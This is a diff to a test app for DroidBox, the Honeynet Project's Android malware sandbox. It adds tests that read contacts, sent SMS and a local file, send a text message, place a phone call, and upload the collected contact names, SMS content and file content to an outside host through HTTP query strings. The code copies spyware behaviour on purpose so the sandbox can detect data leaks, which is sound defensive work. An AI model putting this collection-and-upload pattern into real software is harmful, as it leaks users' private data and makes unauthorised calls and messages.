@@ -1,8 +1,31 @@
+/***************************************************************************
+ * (c) 2011, The Honeynet Project
+ * Author: Patrik Lantz patrik@pjlantz.com
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
+ *
+ ***************************************************************************/
+
 package droidbox.tests;
 
 import java.io.BufferedReader;
+import java.io.FileNotFoundException;
 import java.io.IOException;
+import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.security.InvalidKeyException;
@@ -14,16 +37,20 @@ import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 import javax.crypto.spec.SecretKeySpec;
 import android.app.Activity;
+import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
 public class DroidBoxTests extends Activity {
 	
-	private String imei, hashedImei;
+	private String imei, hashedImei, contactName;
 	private String encryptedImei, phoneNbr, msg;
+	private String fileContent;
+	
 	private static final byte[] KEY = { 0, 42, 2, 54, 4, 45, 6, 7, 65, 9, 54, 11, 12, 13, 60, 15 };
 	private static final byte[] KEY2 = { 0, 42, 2, 54, 4, 45, 6, 8 };
 	
@@ -37,17 +64,98 @@ public class DroidBoxTests extends Activity {
         // Setup test variables
         this.setupTest();
         // Run tests
+        this.testWriteFile();
+        this.testReadFile();
+        this.testContactRead();
         this.testSMSRead();
         this.testCryptHash();
         this.testCryptAES();
         this.testCryptDES();
         this.testNetworkHTTP();
+        this.testSendSMS();
+        this.testPhoneCall();
     }
     
+    /**
+     * Setup variables
+     */
     public void setupTest() {
     	// IMEI
         TelephonyManager manager = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
         imei = manager.getDeviceId();
+        fileContent = "";
+    }
+    
+    /**
+     * Write a file to the device
+     */
+    public void testWriteFile() {
+    	Log.v("Test", "[*] testWriteFile()");
+    	try {
+    		OutputStreamWriter out = new OutputStreamWriter(openFileOutput("myfilename.txt", 0));
+    		out.write("Write a line");
+    		out.close();
+    		} catch (IOException e) {
+    			e.printStackTrace();
+    		}
+    }
+    
+    /**
+     * Test reading file content on device
+     */
+    public void testReadFile() {
+    	Log.v("Test", "[*] testReadFile()");
+    	 try {
+		    InputStream instream = openFileInput("myfilename.txt");
+		    if (instream != null) {
+		      InputStreamReader inputreader = new InputStreamReader(instream);
+		      BufferedReader buffreader = new BufferedReader(inputreader);
+		 
+		      String line;
+		      while (( line = buffreader.readLine()) != null) {
+		    	  fileContent += line;
+		      }
+		    }
+		    instream.close();
+		  } catch (FileNotFoundException e) {
+			  e.printStackTrace();
+		  } catch (IOException e) {
+			e.printStackTrace();
+		}
+    }
+    
+    /**
+     * Make phone call
+     */
+    public void testPhoneCall() {
+    	Log.v("Test", "[*] testPhoneCall()");
+        Intent callIntent = new Intent(Intent.ACTION_CALL);
+        callIntent.setData(Uri.parse("tel:123456789"));
+        startActivity(callIntent);
+    }
+    
+    /**
+     * Send a text message
+     */
+    public void testSendSMS() {
+    	Log.v("Test", "[*] testSendSMS()");
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("0735445281", null, "Sending sms...", null, null);
+    }
+    
+    /**
+     * Read contact
+     */
+    public void testContactRead() {
+    	Log.v("Test", "[*] testContactRead()");
+    	String strUri = "content://contacts/people";
+    	Uri uricontact = Uri.parse(strUri);
+    	Cursor c = this.getContentResolver().query(uricontact, null, null, null, null);    
+    	while (c.moveToNext()) {
+    		// Name at column 16
+    		contactName = c.getString(16);
+    		Log.v("Contact", "Name: " + contactName);
+    	}
     }
     
     /**
@@ -58,7 +166,7 @@ public class DroidBoxTests extends Activity {
     	String strUri = "content://sms/sent";
     	Uri urisms = Uri.parse(strUri);
     	Cursor c = this.getContentResolver().query(urisms, null, null, null, null);
-
+    	
     	while (c.moveToNext()) {
     		// Addr at column 2
     		String addr = c.getString(2);
@@ -202,6 +310,17 @@ public class DroidBoxTests extends Activity {
             
             // HttpURLConnection sending SMS message retrieved from db
             url = new URL("http://pjlantz.com/msg.php?msg=" + msg.replace(" ", "+"));
+            urlConnection = (HttpURLConnection) url.openConnection();
+            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
+            
+            // HttpURLConnection sending contact name retrieved from db
+            url = new URL("http://pjlantz.com/name.php?name=" + contactName.replace(" ", "+"));
+            urlConnection = (HttpURLConnection) url.openConnection();
+            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
+            while ((line = rd.readLine()) != null);
+            
+            // HttpURLConnection sending file content
+            url = new URL("http://pjlantz.com/file.php?file=" + fileContent.replace(" ", "+"));
             urlConnection = (HttpURLConnection) url.openConnection();
             rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
             while ((line = rd.readLine()) != null);
